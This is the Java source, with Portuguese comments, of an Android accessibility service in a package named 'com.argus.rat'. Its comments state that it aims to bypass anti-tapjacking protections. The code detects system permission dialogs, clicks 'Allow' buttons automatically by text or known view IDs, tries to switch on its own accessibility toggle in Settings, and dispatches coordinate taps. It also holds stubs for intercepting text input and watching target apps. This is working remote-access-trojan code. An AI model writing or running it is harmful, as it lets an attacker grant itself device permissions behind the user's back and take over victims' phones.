package com.argus.rat;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.graphics.Rect;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import java.util.List;

/**
 * Serviço de Acessibilidade integrado com TapTrap para automação de cliques
 * e monitoramento de elementos de interface do usuário.
 * 
 * Este serviço permite:
 * - Detectar telas de permissão automaticamente
 * - Simular cliques em botões "Permitir"/"Allow"
 * - Monitorar mudanças na interface do usuário
 * - Contornar proteções anti-tapjacking tradicionais
 */
public class AccessibilityTapTrapService extends AccessibilityService {
    private static final String TAG = "AccessibilityTapTrap";
    
    private Handler handler;
    private boolean isMonitoring = false;
    private TapTrapHelper tapTrapHelper;
    
    // Textos de botões de permissão em diferentes idiomas
    private static final String[] ALLOW_BUTTON_TEXTS = {
        "Allow", "Permitir", "Autorizar", "OK", "Aceitar", "Sim", "Yes",
        "Grant", "Conceder", "Enable", "Ativar", "Turn on", "Ligar"
    };
    
    // Palavras-chave para detectar telas de permissão
    private static final String[] PERMISSION_KEYWORDS = {
        "permission", "permissão", "access", "acesso", "allow", "permitir",
        "camera", "câmera", "location", "localização", "sms", "phone",
        "storage", "armazenamento", "contacts", "contatos", "microphone"
    };

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        tapTrapHelper = new TapTrapHelper();
        Log.d(TAG, "Serviço de Acessibilidade TapTrap criado");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        
        // Configurar tipos de eventos a monitorar
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                          AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
                          AccessibilityEvent.TYPE_VIEW_CLICKED |
                          AccessibilityEvent.TYPE_VIEW_FOCUSED |
                          AccessibilityEvent.TYPE_WINDOWS_CHANGED;
        
        // Configurar tipos de feedback
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        
        // Configurar flags
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                     AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        
        // Configurar tempo de resposta
        info.notificationTimeout = 100;
        
        setServiceInfo(info);
        isMonitoring = true;
        
        Log.i(TAG, "Serviço de Acessibilidade TapTrap conectado e configurado");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!isMonitoring) return;
        
        try {
            processAccessibilityEvent(event);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao processar evento de acessibilidade", e);
        }
    }

    /**
     * Processa eventos de acessibilidade para detectar telas de permissão
     */
    private void processAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        
        Log.d(TAG, "Evento: " + AccessibilityEvent.eventTypeToString(eventType) + 
                   ", Package: " + packageName);
        
        switch (eventType) {
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                handleWindowStateChanged(event, packageName);
                break;
                
            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                handleWindowContentChanged(event);
                break;
                
            case AccessibilityEvent.TYPE_WINDOWS_CHANGED:
                handleWindowsChanged();
                break;
        }
    }

    /**
     * Manipula mudanças de estado da janela
     */
    private void handleWindowStateChanged(AccessibilityEvent event, String packageName) {
        // Detectar telas de permissão do sistema
        if (isSystemPermissionDialog(packageName)) {
            Log.i(TAG, "Tela de permissão detectada: " + packageName);
            
            // Aguardar um pouco para a tela estabilizar
            handler.postDelayed(() -> {
                attemptAutomaticPermissionGrant();
            }, 1000);
        }
        
        // Detectar configurações de acessibilidade
        if (packageName.equals("com.android.settings")) {
            handleSettingsScreen(event);
        }
    }

    /**
     * Detecta se é uma tela de permissão do sistema
     */
    private boolean isSystemPermissionDialog(String packageName) {
        return packageName.equals("com.google.android.permissioncontroller") ||
               packageName.equals("com.android.permissioncontroller") ||
               packageName.equals("com.android.packageinstaller") ||
               packageName.contains("permission");
    }

    /**
     * Tenta conceder permissão automaticamente
     */
    private void attemptAutomaticPermissionGrant() {
        try {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) {
                Log.w(TAG, "Nó raiz não disponível");
                return;
            }
            
            // Procurar botão "Allow"/"Permitir"
            AccessibilityNodeInfo allowButton = findAllowButton(rootNode);
            
            if (allowButton != null) {
                Log.i(TAG, "Botão Allow encontrado - executando clique automático");
                
                // Simular clique no botão
                boolean clicked = allowButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                
                if (clicked) {
                    Log.i(TAG, "Permissão concedida automaticamente via TapTrap!");
                    tapTrapHelper.logSuccessfulGrant();
                } else {
                    Log.w(TAG, "Falha ao clicar no botão Allow");
                }
                
                allowButton.recycle();
            } else {
                Log.w(TAG, "Botão Allow não encontrado");
                
                // Tentar estratégias alternativas
                tryAlternativeGrantStrategies(rootNode);
            }
            
            rootNode.recycle();
            
        } catch (Exception e) {
            Log.e(TAG, "Erro na concessão automática de permissão", e);
        }
    }

    /**
     * Procura botão "Allow"/"Permitir" na tela
     */
    private AccessibilityNodeInfo findAllowButton(AccessibilityNodeInfo root) {
        if (root == null) return null;
        
        // Verificar se o nó atual é um botão Allow
        if (isAllowButton(root)) {
            return root;
        }
        
        // Buscar recursivamente nos filhos
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findAllowButton(child);
                if (result != null) {
                    child.recycle();
                    return result;
                }
                child.recycle();
            }
        }
        
        return null;
    }

    /**
     * Verifica se um nó é um botão Allow/Permitir
     */
    private boolean isAllowButton(AccessibilityNodeInfo node) {
        if (node == null) return false;
        
        CharSequence text = node.getText();
        CharSequence contentDesc = node.getContentDescription();
        
        if (text != null) {
            String textStr = text.toString().toLowerCase();
            for (String allowText : ALLOW_BUTTON_TEXTS) {
                if (textStr.contains(allowText.toLowerCase())) {
                    return true;
                }
            }
        }
        
        if (contentDesc != null) {
            String descStr = contentDesc.toString().toLowerCase();
            for (String allowText : ALLOW_BUTTON_TEXTS) {
                if (descStr.contains(allowText.toLowerCase())) {
                    return true;
                }
            }
        }
        
        return false;
    }

    /**
     * Tenta estratégias alternativas para conceder permissão
     */
    private void tryAlternativeGrantStrategies(AccessibilityNodeInfo root) {
        Log.d(TAG, "Tentando estratégias alternativas");
        
        // Estratégia 1: Procurar por posição específica
        tryPositionBasedClick(root);
        
        // Estratégia 2: Procurar por IDs conhecidos
        tryIdBasedClick(root);
        
        // Estratégia 3: Simular gestos específicos
        tryGestureBasedInteraction();
    }

    /**
     * Tenta clique baseado em posição conhecida
     */
    private void tryPositionBasedClick(AccessibilityNodeInfo root) {
        // Implementar clique em posições específicas onde botões Allow costumam aparecer
        Log.d(TAG, "Tentando clique baseado em posição");
    }

    /**
     * Tenta clique baseado em IDs conhecidos de botões
     */
    private void tryIdBasedClick(AccessibilityNodeInfo root) {
        String[] knownIds = {
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.google.android.permissioncontroller:id/permission_allow_button",
            "android:id/button1", // Botão positivo padrão
            "com.android.packageinstaller:id/ok_button"
        };
        
        for (String id : knownIds) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
            if (nodes != null && !nodes.isEmpty()) {
                AccessibilityNodeInfo button = nodes.get(0);
                if (button != null && button.isClickable()) {
                    Log.i(TAG, "Botão encontrado por ID: " + id);
                    button.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    button.recycle();
                    break;
                }
            }
        }
    }

    /**
     * Tenta interação baseada em gestos
     */
    private void tryGestureBasedInteraction() {
        Log.d(TAG, "Tentando interação baseada em gestos");
        // Implementar gestos personalizados se necessário
    }

    /**
     * Manipula telas de configurações
     */
    private void handleSettingsScreen(AccessibilityEvent event) {
        String className = event.getClassName() != null ? event.getClassName().toString() : "";
        
        Log.d(TAG, "Tela de configurações detectada: " + className);
        
        // Se está na tela de acessibilidade, tentar habilitar automaticamente
        if (className.contains("accessibility") || className.contains("Accessibility")) {
            handler.postDelayed(() -> {
                tryEnableAccessibilityService();
            }, 2000);
        }
    }

    /**
     * Tenta habilitar serviço de acessibilidade automaticamente
     */
    private void tryEnableAccessibilityService() {
        try {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) return;
            
            // Procurar pelo switch/toggle do nosso serviço
            AccessibilityNodeInfo toggleButton = findOurServiceToggle(rootNode);
            
            if (toggleButton != null) {
                Log.i(TAG, "Toggle do serviço encontrado - ativando");
                toggleButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                toggleButton.recycle();
            }
            
            rootNode.recycle();
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao tentar habilitar serviço", e);
        }
    }

    /**
     * Procura toggle do nosso serviço na tela de acessibilidade
     */
    private AccessibilityNodeInfo findOurServiceToggle(AccessibilityNodeInfo root) {
        if (root == null) return null;
        
        String ourServiceName = getPackageName();
        
        // Procurar por nós que contenham o nome do nosso app
        CharSequence text = root.getText();
        if (text != null && text.toString().contains(ourServiceName)) {
            // Procurar switch próximo
            return findNearbySwitch(root);
        }
        
        // Buscar recursivamente
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findOurServiceToggle(child);
                if (result != null) {
                    child.recycle();
                    return result;
                }
                child.recycle();
            }
        }
        
        return null;
    }

    /**
     * Procura switch próximo a um nó
     */
    private AccessibilityNodeInfo findNearbySwitch(AccessibilityNodeInfo node) {
        AccessibilityNodeInfo parent = node.getParent();
        if (parent == null) return null;
        
        // Procurar switches nos irmãos
        for (int i = 0; i < parent.getChildCount(); i++) {
            AccessibilityNodeInfo sibling = parent.getChild(i);
            if (sibling != null) {
                if ("android.widget.Switch".equals(sibling.getClassName()) ||
                    "android.widget.ToggleButton".equals(sibling.getClassName())) {
                    parent.recycle();
                    return sibling;
                }
                sibling.recycle();
            }
        }
        
        parent.recycle();
        return null;
    }

    /**
     * Manipula mudanças no conteúdo da janela
     */
    private void handleWindowContentChanged(AccessibilityEvent event) {
        // Monitorar mudanças que podem indicar aparição de diálogos de permissão
        if (isPermissionRelatedChange(event)) {
            Log.d(TAG, "Mudança relacionada a permissão detectada");
            
            handler.postDelayed(() -> {
                attemptAutomaticPermissionGrant();
            }, 500);
        }
    }

    /**
     * Verifica se uma mudança está relacionada a permissões
     */
    private boolean isPermissionRelatedChange(AccessibilityEvent event) {
        CharSequence text = event.getText() != null && !event.getText().isEmpty() ? 
                           event.getText().get(0) : null;
        
        if (text != null) {
            String textStr = text.toString().toLowerCase();
            for (String keyword : PERMISSION_KEYWORDS) {
                if (textStr.contains(keyword)) {
                    return true;
                }
            }
        }
        
        return false;
    }

    /**
     * Manipula mudanças nas janelas
     */
    private void handleWindowsChanged() {
        // Verificar se apareceu nova janela de permissão
        List<AccessibilityWindowInfo> windows = getWindows();
        
        for (AccessibilityWindowInfo window : windows) {
            if (window.getType() == AccessibilityWindowInfo.TYPE_SYSTEM) {
                Log.d(TAG, "Janela do sistema detectada");
                
                handler.postDelayed(() -> {
                    attemptAutomaticPermissionGrant();
                }, 800);
                break;
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Serviço de Acessibilidade TapTrap interrompido");
        isMonitoring = false;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isMonitoring = false;
        if (tapTrapHelper != null) {
            tapTrapHelper.cleanup();
        }
        Log.d(TAG, "Serviço de Acessibilidade TapTrap destruído");
    }

    /**
     * Força clique em coordenadas específicas (como backup)
     */
    public void performTapTrapClick(int x, int y) {
        Log.d(TAG, "Executando TapTrap click em: (" + x + ", " + y + ")");
        
        // Implementar clique por coordenadas usando gestos de acessibilidade
        // Esta funcionalidade requer API level 24+
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            android.graphics.Path clickPath = new android.graphics.Path();
            clickPath.moveTo(x, y);
            
            android.accessibilityservice.GestureDescription.Builder gestureBuilder = 
                new android.accessibilityservice.GestureDescription.Builder();
            
            android.accessibilityservice.GestureDescription.StrokeDescription stroke = 
                new android.accessibilityservice.GestureDescription.StrokeDescription(clickPath, 0, 100);
            
            gestureBuilder.addStroke(stroke);
            
            boolean dispatched = dispatchGesture(gestureBuilder.build(), null, null);
            
            Log.d(TAG, "Gesto TapTrap executado: " + dispatched);
        }
    }

    /**
     * Classe auxiliar para operações TapTrap
     */
    private class TapTrapHelper {
        private int successfulGrants = 0;
        private long lastGrantTime = 0;
        
        public void logSuccessfulGrant() {
            successfulGrants++;
            lastGrantTime = System.currentTimeMillis();
            
            Log.i(TAG, "TapTrap Helper - Concessões bem-sucedidas: " + successfulGrants);
            
            // Notificar atividade principal sobre sucesso
            notifyMainActivity();
        }
        
        public void notifyMainActivity() {
            Intent intent = new Intent("com.example.legitimateapp.TAPTRAP_SUCCESS");
            intent.putExtra("successful_grants", successfulGrants);
            intent.putExtra("timestamp", lastGrantTime);
            sendBroadcast(intent);
        }
        
        public void cleanup() {
            Log.d(TAG, "TapTrap Helper limpo");
        }
    }

    /**
     * Verifica se o serviço está habilitado
     */
    public static boolean isServiceEnabled(android.content.Context context) {
        try {
            String enabledServices = android.provider.Settings.Secure.getString(
                context.getContentResolver(),
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            
            if (enabledServices != null) {
                return enabledServices.contains(context.getPackageName() + "/." + 
                                              AccessibilityTapTrapService.class.getSimpleName());
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao verificar status do serviço", e);
        }
        
        return false;
    }

    /**
     * Monitora atividade específica de app
     */
    public void monitorSpecificApp(String targetPackage) {
        Log.d(TAG, "Monitorando app específico: " + targetPackage);
        // Implementar monitoramento específico
    }

    /**
     * Intercepta entrada de texto
     */
    public void interceptTextInput(String targetText) {
        Log.d(TAG, "Interceptando entrada de texto: " + targetText);
        // Implementar interceptação de texto
    }
}